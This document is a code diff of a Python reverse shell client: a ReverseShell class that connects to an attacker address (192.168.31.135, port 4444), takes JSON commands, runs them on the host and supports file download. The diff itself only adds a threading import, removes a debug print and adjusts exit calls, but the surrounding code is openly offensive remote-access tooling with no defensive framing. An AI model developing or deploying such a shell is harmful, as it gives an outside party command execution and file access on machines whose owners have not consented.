@@ -3,6 +3,7 @@ import subprocess
 import os, sys, base64
 import json
 import shutil
+import threading
 class ReverseShell:
     def __init__(self, attacker_ip="192.168.31.135", attacker_port=4444):
         self.attacker_ip = attacker_ip
@@ -58,7 +59,6 @@ class ReverseShell:
                 result = json.loads(json_data)
                 if not isinstance(result,list):
                     result= result.split(" ")
-                print(f"the received data{result}")
                 return result
             except:
                 continue
@@ -73,8 +73,9 @@ class ReverseShell:
             while True:
                 command = self.receiving_data()
                 if command in ["exit", "quit"]:
+                    output = "Client disconnected successful"
                     self.sock.close()
-                    exit()
+                    sys.exit()
                     break
                 output = self.run_command(command)
                 self.sending_data(output)
@@ -96,6 +97,7 @@ class ReverseShell:
                     output = "Error: Permission denied.\n"
             elif command[0] == "exit":
                 self.sock.close()
+                sys.exit(0)
 
             elif command[0] == "download":
                 if len(command) > 1:
